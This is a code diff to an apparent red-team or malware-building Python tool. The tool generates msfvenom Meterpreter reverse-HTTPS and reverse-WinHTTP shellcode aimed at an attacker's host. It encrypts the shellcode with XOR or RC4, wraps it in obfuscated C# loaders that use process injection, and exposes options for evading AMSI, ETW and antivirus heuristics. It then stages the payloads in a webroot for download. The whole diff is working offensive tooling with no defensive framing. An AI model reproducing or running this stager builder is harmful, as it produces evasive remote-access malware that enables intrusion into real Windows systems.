@@ -10,8 +10,6 @@ import argparse
 # Words to use to randomize namespace, class, and function names
 WORDS = open("/usr/share/dict/words").read().splitlines()
 
-MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
-
 # Randomly generate keys at runtime
 XOR_KEY = os.urandom(1)
 RC4_KEY = random.choice(WORDS).encode('utf-8')
@@ -61,6 +59,17 @@ class Stager:
 
     self.shellcode_fn = self.args.output + '.sc'
 
+    # Set msfvenom flags
+    if self.args.msfpayload == 'reverse_winhttp':
+      self.msfvenom_cmd = f"msfvenom -p windows/x64/custom/reverse_winhttp LURI=/hello.woff LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
+    elif self.args.msfpayload == 'reverse_https':
+      self.msfvenom_cmd = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
+    else:
+      print("Invalid msfvenom type")
+      sys.exit(1)
+
+
+
     if args.format == "dll":
       self.compiled = True
       self.source_fn = self.args.output + ".cs"
@@ -92,15 +101,20 @@ class Stager:
       self.save_shellcode_to_file()
 
   def generate_shellcode(self):
-    print(f"Generating shellcode with: {MSFVENOM_CMD}")
+    global XOR_KEY
+    print(f"Generating shellcode with: {self.msfvenom_cmd}")
     if self.encrypt == 'xor':
+      # Ensure XOR key is not null
+      while XOR_KEY == b'\x00':
+        XOR_KEY = os.urandom(1)
+
       print(f"Using XOR key {XOR_KEY}")
-      self.shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
+      self.shellcode = ak.ShellCode(self.msfvenom_cmd, xor_key=XOR_KEY)
     elif self.encrypt == 'rc4':
       print(f"Using RC4 key {RC4_KEY}")
-      self.shellcode = ak.ShellCode(MSFVENOM_CMD, rc4_key=RC4_KEY)
+      self.shellcode = ak.ShellCode(self.msfvenom_cmd, rc4_key=RC4_KEY)
 
-  def generate_source(self):
+  def generate_stager_source(self):
     url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=ak.STAGER_URL)
     
     # Create obfuscator for loaders that need obfuscation
@@ -117,6 +131,7 @@ class Stager:
       # Staged
       main_code = f"""{url_dl_code}"""
 
+    # Decryption functions
     if self.encrypt == 'xor':
       main_code += ak.SC_XOR_DECODER.format(enc_key=self.shellcode.get_key_csharp())
     elif self.encrypt == 'rc4':
@@ -174,7 +189,7 @@ class Stager:
     shutil.copyfile(src, out)
 
   def run(self):
-    self.generate_source()
+    self.generate_stager_source()
     
     if self.compiled:
       print("Compiling...")
@@ -182,6 +197,7 @@ class Stager:
       print(f"Compiled {self.compiled_fn}")
 
       # Copy files to webroot
+      print(f"*** Copying files to webroot {ak.WEBROOT_DIR}")
       self.copy_to_webroot(self.compiled_fn)
       self.copy_to_webroot(self.shellcode_fn, dest="sc")
 
@@ -198,16 +214,17 @@ class Stager:
                                           tool_classname=self.cs_classname,
                                           cmd="")
 
-    if self.args.format == 'dll':
+    if self.args.format == 'dll' or self.args.format == 'exe':
         print("Load with:")
         print(t)
 
 
 def main():
   parser = argparse.ArgumentParser()
-  parser.add_argument('--injection', '-i', default='standard', choices=ak.main_choices.keys())
-  parser.add_argument('--format', '-f', default='exe', choices=['exe', 'dll', 'aspx'])
-  parser.add_argument('--encrypt', '-e', default='xor', choices=['xor', 'rc4'])
+  parser.add_argument('--injection', '-i', default='earlybird', choices=ak.main_choices.keys())
+  parser.add_argument('--msfpayload', default='reverse_winhttp', choices=['reverse_winhttp', 'reverse_https'])
+  parser.add_argument('--format', '-f', default='dll', choices=['exe', 'dll', 'aspx'])
+  parser.add_argument('--encrypt', '-e', default='rc4', choices=['xor', 'rc4'])
   parser.add_argument('--heuristics', default=True, action='store_true')
   parser.add_argument('--amsi', default=False, action='store_true')
   parser.add_argument('--etw', default=True, action='store_true')
